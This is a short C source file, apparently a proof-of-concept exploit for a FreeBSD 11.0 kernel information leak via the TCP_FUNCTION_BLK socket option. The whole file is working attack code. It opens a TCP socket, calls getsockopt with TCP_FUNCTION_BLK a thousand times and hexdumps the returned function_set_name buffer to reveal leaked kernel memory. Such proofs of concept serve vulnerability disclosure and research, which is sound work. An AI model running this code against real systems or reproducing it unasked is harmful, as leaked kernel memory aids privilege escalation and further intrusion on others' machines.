/* FreeBSD 11.0 setsockopt TCP_FUNCTION_BLK infoleak */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>


void hexdump(unsigned char *ptr, int len) {
	int i;
	for (i=0; i< len; i++) {
		if (!(i%16) && i) {
			printf("\n");
		}
		printf("%02x ", ptr[i]);
	}
	printf("\n");
	return;
}

int main(void) { 
	struct tcp_function_set tfs;
	socklen_t len = sizeof(tfs);
	int sock; 

	memset(&tfs, 0x00, sizeof(tfs));

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		printf("socket() failed\n");
		exit(0);
	}

	int i;
	for(i=0;i<1000;i++) {
		int r = getsockopt(sock, IPPROTO_TCP, TCP_FUNCTION_BLK, &tfs, &len);
		if (r != 0) {
			printf("getsockopt() failed\n");
			exit(0);
		}

		hexdump(tfs.function_set_name, sizeof(tfs.function_set_name)); 
	}
}

